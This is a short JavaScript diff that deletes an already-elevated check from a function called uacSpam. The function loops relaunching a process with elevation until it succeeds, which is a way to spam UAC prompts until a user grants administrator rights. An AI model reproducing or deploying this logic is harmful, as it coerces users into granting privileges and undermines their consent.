@@ -25,10 +25,6 @@ function runProcess(runPath, elevated) {
 }
 
 function uacSpam(path) {
-    if (isElevated()) {
-        return;
-    }
-
     let elevated = false;
     while (!elevated) {
         elevated = runProcess(path, true);
